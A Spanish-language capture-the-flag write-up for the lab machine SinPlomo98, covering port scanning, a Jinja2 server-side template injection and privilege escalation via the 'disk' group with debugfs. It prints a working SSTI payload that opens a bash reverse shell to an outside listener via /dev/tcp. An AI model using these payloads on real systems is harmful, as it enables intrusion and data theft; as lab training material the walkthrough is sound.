# SinPlomo98 - Writeup (CTF)

**Dificultad:** Media  
**IP de la Máquina:** `192.168.0.102`  
**Objetivo:** Obtener acceso al sistema explotando SSTI y escalar a `root` mediante privilegios mal configurados en el grupo de discos.

---

## 📝 Descripción General

El compromiso de la máquina **SinPlomo98** se divide en tres fases principales:
1. **Enumeración:** Descubrimiento de un servicio web alternativo en el puerto 5000 y un archivo en el servicio FTP que desvía la atención.
2. **Intrusión:** Identificación y explotación de una vulnerabilidad de Inyección de Plantillas del Lado del Servidor (SSTI) en Werkzeug (Jinja2) para obtener una *reverse shell*.
3. **Escalada de Privilegios:** Explotación de la pertenencia del usuario al grupo `disk`, permitiendo la lectura directa del sistema de archivos, la extracción del hash SSH de `root` y su posterior crackeo.

---

## 🔍 1. Enumeración y Reconocimiento

### Escaneo de Puertos (Nmap)
Se realiza un escaneo completo de los 65535 puertos TCP para mapear la superficie de ataque:

```bash
nmap -Pn -p- --min-rate 5000 192.168.0.102
```

**Puertos abiertos detectados:**
* **21/tcp:** FTP (vsFTPd 3.0.3)
* **22/tcp:** SSH (OpenSSH 9.2p1)
* **80/tcp:** HTTP (Apache 2.4.59)
* **5000/tcp:** HTTP (Werkzeug 3.0.3 / Python 3.11.2)

### Análisis de Servicios y Contenido
Un escaneo detallado revela acceso anónimo en el servidor FTP:

```bash
nmap -sCV -p 21,22,80,5000 192.168.0.102
```

Al descargar el archivo `supermegaultraimportantebro.txt` vía FTP, se confirma que es una pista falsa (*rabbit hole*). Al inspeccionar el código fuente del puerto 5000, se encuentra un comentario oculto que apunta a una ruta oculta:

```html
<!-- /petrolhead -->
```

---

## ⚡ 2. Acceso Inicial (Explotación)

### Identificación de SSTI
Al interactuar con el parámetro `user_input` en el recurso `/petrolhead`, se inyecta una operación aritmética básica para validar el motor de plantillas:

```bash
curl http://192.168.0.102:5000/petrolhead -d 'user_input={{7*7}}'
```
**Respuesta:** `49` (Confirmando vulnerabilidad SSTI, compatible con Jinja2).

### Ejecución de Comando y Reverse Shell
Utilizando un payload clásico de ejecución de comandos tomado de *PayloadAllTheThings*, se fuerza al servidor web a devolver una conexión hacia nuestra máquina de escucha (`192.168.0.5:4444`):

```text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/192.168.0.5/4444 0>&1'").read() }}
```
url: http://192.168.0.102:5000/petrolhead?cmd=id
Recibimos la conexión y estabilizamos la TTY de la siguiente forma:
```bash
nc -lvp 4444
script /dev/null -c bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# [Ctrl+Z]
stty raw -echo ; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 45 columns 180
```

---

## 🚀 3. Escalada de Privilegios

### Abuso del Grupo 'disk'
Al validar los privilegios del usuario obtenido (`tcuser`), se identifica que pertenece al grupo **disk**:

```bash
tcuser@SinPLomo98:~\$ id
uid=1001(tcuser) gid=1001(tcuser) grupos=1001(tcuser),6(disk)
```
```bash
tcuser@SinPLomo98:~$ df -h  
S.ficheros     Tamaño Usados  Disp Uso% Montado en  
udev             962M      0  962M   0% /dev  
tmpfs            197M   524K  197M   1% /run  
/dev/sda1         19G   2,3G   16G  14% /  
tmpfs            984M      0  984M   0% /dev/shm  
tmpfs            5,0M      0  5,0M   0% /run/lock  
tcuser@SinPLomo98:~$ debugfs /dev/sda1  
debugfs 1.47.0
debugfs:  cat /root/root.txt  

```


¡Acceso completo a `root` obtenido con éxito!
